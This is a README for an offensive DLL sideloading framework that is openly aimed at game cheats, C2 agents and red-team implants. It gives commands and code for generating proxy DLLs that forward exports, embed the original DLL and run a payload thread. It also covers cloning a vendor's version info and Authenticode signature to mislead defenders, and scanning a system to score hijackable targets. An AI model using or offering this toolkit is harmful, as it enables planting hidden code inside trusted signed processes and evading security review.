# DLL Proxy Framework

## Why DLL Sideloading?

DLL sideloading lets your code — whether it's a game cheat, C2 agent, or red team implant — execute inside a legitimate, signed process. To a defender triaging alerts or reviewing logs, the running `.exe` looks completely benign: it's a trusted vendor binary with a valid signature. Your payload is just along for the ride as a DLL it was going to load anyway.

This framework automates the tedious part: analyzing the target DLL's exports, generating the proxy code that forwards every function call to the original, and giving you a clean slot for your payload. Pick a [hijackable DLL](https://hijacklibs.net), run one command, drop in your code, build.

---

Generate proxy DLL projects for DLL sideloading and hijacking research. Point it at a DLL, get a ready-to-compile project that mirrors all exports and forwards them to the original — with a slot for your payload code.

## Workflow

1. Pick a target DLL (e.g. from [hijacklibs.net](https://hijacklibs.net))
2. Run the generator
3. Edit `payload.c` with your loader code
4. Build with MSVC or MinGW
5. Deploy

```
python generate.py C:\Windows\System32\version.dll --payload --embed --block
```

## Features

- **Export mirroring** — Analyzes PE export table and generates assembly trampolines (`jmp [ptr]`) that transparently forward all calls to the original DLL. Handles named exports, ordinal-only exports, forwarded exports, and C++ mangled names.
- **Embed mode** (`--embed`) — Bakes the original DLL as a PE resource. At load time it extracts to `%TEMP%` and loads it. No need to ship a second DLL file.
- **Payload thread** (`--payload`) — Generates a `payload.c` template. Your code runs in a separate thread after all exports are resolved.
- **Block mode** (`--block`) — Suspends the main thread so the process can't exit before your payload finishes. Uses a two-layer approach: primary suspend + atexit fallback. No loader lock issues.
- **MetaTwin cloning** — Automatically clones PE version info (CompanyName, FileDescription, FileVersion, etc.) and Authenticode signature from the source DLL. The proxy looks identical to the original in file properties and shows the original signer in signature dialogs.
- **Dual compiler support** — Generates both MSVC (`.asm` + `build_msvc.bat`) and MinGW (`.S` + `Makefile`) build files.
- **Both architectures** — x86 and x64, auto-detected from the input DLL.

## Installation

```
pip install -r requirements.txt
```

Requires Python 3.10+ and either Visual Studio (MSVC) or MinGW-w64 for building.

## Usage

```
python generate.py <dll_path> [options]

Options:
  -o, --output DIR             Output directory (default: ./output/<name>_proxy/)
  --embed                      Embed original DLL as a PE resource
  --payload                    Include payload thread template
  --block                      Block process exit until payload finishes (implies --payload)
  --compiler {msvc,gcc,both}   Target compiler (default: both)
  --arch {x86,x64,auto}        Target architecture (default: auto-detect)
  --original-name NAME         Runtime filename for original DLL (non-embed mode)
  -v, --verbose                Show all exports and generated files
  --dry-run                    Show what would be generated without writing
```

### Examples

Minimal proxy (no payload, load original from disk):
```
python generate.py C:\Windows\System32\version.dll
```

Full sideloading setup with embedded DLL and blocking payload:
```
python generate.py C:\Windows\System32\version.dll --payload --embed --block
```

MSVC-only, verbose:
```
python generate.py C:\Windows\System32\dbghelp.dll --payload --compiler msvc -v
```

## Generated Project Structure

```
version_proxy/
├── proxy.c              # DllMain, function pointer table, init/cleanup
├── proxy.h              # Exported function pointer declarations
├── exports.def          # Module definition file (maps exports to trampolines)
├── trampolines.asm      # MSVC MASM — one jmp [ptr] per export
├── trampolines.S        # MinGW GAS — same, AT&T/Intel syntax
├── payload.c            # Your code goes here
├── payload.h            # Payload thread declaration
├── resource.rc          # Version info + embedded DLL resource
├── resource.h           # Resource IDs
├── original_version.dll # Copy of original DLL
├── sigclone.py          # Post-build signature cloner (auto-run)
├── build_msvc.bat       # Build with cl.exe + ml64.exe
└── Makefile             # Build with gcc + as
```

## Building

**MSVC** — open a Developer Command Prompt:
```
cd output\version_proxy
build_msvc.bat
```

**MinGW**:
```
cd output\version_proxy
mingw32-make
```

## How It Works

### Export Forwarding

Each export becomes an assembly trampoline that jumps through a function pointer:

```asm
; x64 MASM
proxy_GetFileVersionInfoA PROC
    jmp QWORD PTR [fp_GetFileVersionInfoA]
proxy_GetFileVersionInfoA ENDP
```

The `.def` file maps the original export name to the trampoline label:
```def
GetFileVersionInfoA = proxy_GetFileVersionInfoA @1
```

At `DLL_PROCESS_ATTACH`, the original DLL is loaded and all function pointers are resolved via `GetProcAddress`. Calls flow through transparently — no register clobbering, no calling convention issues.

### Block Mode

When the host process would exit immediately (e.g. printing `--help`), `--block` keeps it alive:

1. **Primary**: The payload thread suspends the main thread (after loader lock releases). Main is frozen before it can reach `main()` or `ExitProcess`. Payload runs, then calls `ExitProcess(0)`.
2. **Fallback**: If main wins the race, `atexit` handler blocks until the payload signals completion.

Both paths are deadlock-free — no loader lock involvement.

## Testing

A test suite verifies all mode combinations against `version.dll` for both compilers. Requires a Developer Command Prompt (MSVC). GCC tests run automatically if `gcc` and `mingw32-make` are on PATH.

```
cd test
run_tests.bat
```

This generates proxies, builds them, and runs a test host (`test_host.c`) that loads the proxy DLL, calls `GetFileVersionInfoSizeA`, and exits immediately. The tests verify:

| Test | Compiler | Mode | Verifies |
|------|----------|------|----------|
| 1 | MSVC | `--embed --payload` | Embedded DLL extraction + export forwarding |
| 2 | MSVC | `--embed --payload --block` | Block mode keeps process alive, payload completes |
| 3 | MSVC | `--payload` | Side-by-side DLL loading + export forwarding |
| 4 | MSVC | `--payload --block` | Block mode without embedding |
| 5 | GCC | `--embed --payload` | GCC embedded DLL extraction + forwarding |
| 6 | GCC | `--embed --payload --block` | GCC block mode with embedding |
| 7 | GCC | `--payload` | GCC side-by-side loading + forwarding |
| 8 | GCC | `--payload --block` | GCC block mode without embedding |
| 9 | MSVC | `--embed --payload --block` | MetaTwin: version info + signature cloned correctly |
| 10 | GCC | `--embed --payload --block` | MetaTwin: version info + signature cloned correctly |

Expected output:
```
============================================================
 DLL Proxy Framework - Test Suite
============================================================

[*] Compiling test host...
[+] test_host.exe ready

[*] MinGW detected - GCC tests enabled

[TEST 1/MSVC] --embed --payload
------------------------------------------------------------
[+] PASS: MSVC embed forwarding works
...
[TEST 9/META] MSVC --embed --payload --block (metadata + signature)
------------------------------------------------------------
[+] PASS: MSVC embed + block + metatwin

[TEST 10/META] GCC --embed --payload --block (metadata + signature)
------------------------------------------------------------
[+] PASS: GCC embed + block + metatwin

============================================================
 Results: 10 passed, 0 failed
============================================================
```

### MetaTwin (Metadata + Signature Cloning)

The framework automatically clones the source DLL's identity onto the proxy:

1. **Version info** — CompanyName, FileDescription, FileVersion, ProductName, Copyright, etc. are extracted during analysis and compiled into the proxy via `resource.rc`. The proxy's file properties look identical to the original.

2. **Authenticode signature** — After the build, `sigclone.py` copies the source DLL's Authenticode signature onto the proxy. The signature shows the original signer (e.g. "Microsoft Windows") but will report `HashMismatch` under full validation since the binary content differs. Tools that only check for signature presence or display the signer name without validating the hash will show the proxy as signed by the original vendor.

Both steps are automatic — no flags needed. If the source DLL has version info, it's cloned. If it's signed, the signature is cloned as a post-build step.

```
Original:  Valid    | CN=Microsoft Windows, O=Microsoft Corporation
Proxy:     HashMismatch | CN=Microsoft Windows, O=Microsoft Corporation
```

## Example: Linking a Rust Cheat / Implant

If you already have a project written in Rust (a cheat, agent, implant, etc.), you can statically link it into the proxy DLL. The result is a single `.dll` file — your Rust code runs inside the hijacked process with no extra files dropped to disk.

### 1. Compile your Rust project as a static library

In your Rust project's `Cargo.toml`, set the crate type to `staticlib`:

```toml
[lib]
crate-type = ["staticlib"]
```

Expose an entry point with C linkage:

```rust
// src/lib.rs
use std::fs;
use std::io::Write;

#[unsafe(no_mangle)]
pub extern "C" fn cheat_main() {
    // your cheat / implant / agent logic here
    // this runs in its own thread inside the hijacked process

    let pid = std::process::id();
    let msg = format!("Cheat running in PID {}\n", pid);
    if let Ok(mut f) = fs::File::create("proof.txt") {
        let _ = f.write_all(msg.as_bytes());
    }
}
```

> Note: Rust 2024 edition requires `#[unsafe(no_mangle)]`. For older editions use `#[no_mangle]`.

Build it:

```
cargo build --release
```

This produces `target\release\your_crate.lib`.

### 2. Generate the proxy project

```
python generate.py C:\Windows\System32\version.dll --payload --embed --block
```

### 3. Edit `payload.c` to call your Rust code

Replace the generated `payload.c` with:

```c
#include "payload.h"

extern void cheat_main(void);

DWORD WINAPI payload_main(LPVOID lpParam) {
    (void)lpParam;
    cheat_main();
    return 0;
}
```

### 4. Link the Rust `.lib` into the build

**MSVC** — edit `build_msvc.bat`, add the `.lib` and its dependencies to the link line:

```bat
cl /nologo /LD ^
    proxy.c payload.c trampolines.obj resource.res ^
    /link /DEF:exports.def /OUT:version.dll ^
    C:\path\to\your_crate.lib ^
    kernel32.lib user32.lib ws2_32.lib advapi32.lib userenv.lib ^
    ntdll.lib bcrypt.lib msvcrt.lib
```

> The extra system libs (`ws2_32`, `advapi32`, `userenv`, `bcrypt`, etc.) are pulled in by the Rust standard library. If you get unresolved symbols at link time, add the missing lib — the linker error will tell you which one.

**MinGW** — edit the `Makefile`:

```makefile
RUSTLIB = /path/to/your_crate.lib

$(TARGET): $(OBJECTS)
    $(CC) $(CFLAGS) -o $@ $^ $(DEF) $(RUSTLIB) -lkernel32 -luser32 -lws2_32 -ladvapi32 -luserenv -lbcrypt -lntdll
```

### 5. Build and deploy

```
build_msvc.bat
```

The output `version.dll` is a single file containing:
- The proxy export table (forwards all calls to the embedded original)
- The embedded original `version.dll` (extracted at runtime)
- Your entire Rust cheat, statically linked in

Drop it next to the target `.exe`. When the process starts, it loads your proxy as `version.dll`, all API calls work normally, and your Rust code runs in a separate thread — inside a legitimate signed process.

### Deployment layout

```
target_app/
├── legit_signed_app.exe     # Trusted binary that loads version.dll
└── version.dll              # Your proxy (contains original + your Rust code)
```

That's it. One file. The `.exe` in the logs is a signed vendor binary.

## DLL Hijack Scanner

The built-in scanner finds sideloading targets automatically. It walks the filesystem, parses PE import tables, and reports executables that load DLLs vulnerable to hijacking.

**What it detects:**

- **Phantom DLLs** — imported but don't exist anywhere on disk. Drop any DLL with that name and it loads.
- **Search-order hijack** — DLL exists in System32 but not in the app's directory, and the app directory is writable. Plant a proxy there and it loads before the real one.

Both static and delayed imports are checked. Results are scored by exploitability (phantom > search-order, signed > unsigned, user-writable > protected, delayed > static).

```
python scan.py                                        # scan all drives
python scan.py C:\Users D:\Apps                       # scan specific paths
python scan.py --signed-only --skip-windows           # signed EXEs only, skip C:\Windows
python scan.py --json -o results.json                 # JSON output + save to file
python scan.py --generate                             # auto-generate proxy projects for findings
python scan.py --generate --generate-compiler msvc    # generate MSVC-only projects
```

### Scanner options

```
positional:
  paths                          Directories to scan (default: all drives)

options:
  -t, --threads N                Worker threads (default: 8)
  --signed-only                  Only report signed host EXEs
  --skip-windows                 Skip C:\Windows tree (faster)
  -o, --output FILE              Save JSON results to file
  --json                         Print JSON to stdout
  -q, --quiet                    No progress output
  --generate                     Auto-generate proxy projects for search-order hits
  --generate-compiler {msvc,gcc,both}  Compiler for generated projects (default: both)
  --generate-output DIR          Output root for generated projects (default: ./output/scan/)
```

### Score system

Each finding gets a priority score (higher = better target):

| Factor | Score |
|--------|-------|
| Phantom DLL | +3 |
| Search-order hijack | +1 |
| Host EXE is signed | +2 |
| Delayed import | +1 |
| User-writable path (AppData, Users, Temp) | +1 |

### Pipeline: scan + generate

Scan a system, then auto-generate proxy projects for every finding that has a known source DLL:

```
python scan.py C:\Users --signed-only --generate --generate-compiler msvc
```

This runs the scanner, then invokes `generate.py` for each unique (source DLL, architecture) pair with `--payload --embed --block`. Output lands in `./output/scan/`.

## Non-Embed Mode

Without `--embed`, the proxy loads the original DLL from disk at runtime. Rename the original and place it alongside the proxy:

```
target_app/
├── version.dll              # Your proxy
├── original_version.dll     # The real DLL (renamed)
└── app.exe                  # Host application
```

## License

MIT
